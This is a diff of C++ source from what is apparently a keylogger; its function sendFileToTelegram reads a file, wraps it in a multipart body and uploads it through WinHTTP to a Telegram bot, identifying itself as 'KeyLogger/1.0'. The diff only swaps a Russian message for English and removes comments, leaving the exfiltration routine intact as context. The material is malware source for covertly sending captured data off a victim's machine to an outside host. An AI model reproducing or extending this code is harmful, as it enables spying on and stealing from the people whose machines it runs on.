@@ -30,7 +30,7 @@ std::vector<char> readFile(const std::wstring& filePath) {
 void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, const std::wstring& filePath) {
     std::vector<char> fileData = readFile(filePath);
     if (fileData.empty()) {
-        std::wcout << L"Файл пуст или не найден\n";
+        std::wcout << L"File is empty\n";
         return;
     }
 
@@ -38,7 +38,6 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
     std::string boundaryA = "------------------------7e13971310878";
     std::wstring fileName = filePath.substr(filePath.find_last_of(L"\\/") + 1);
 
-    // Формируем multipart body
     std::string body;
     body += "--" + boundaryA + "\r\n";
     body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
@@ -53,7 +52,6 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
     memcpy(&body[fileStart], fileData.data(), fileData.size());
     body += "\r\n--" + boundaryA + "--\r\n";
 
-    // Открываем WinHTTP сессию
     HINTERNET hSession = WinHttpOpen(L"KeyLogger/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return;
 
@@ -83,8 +81,6 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
 
     if (bResults)
         WinHttpReceiveResponse(hRequest, NULL);
-
-    // (Опционально) обработка ответа сервера
 
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
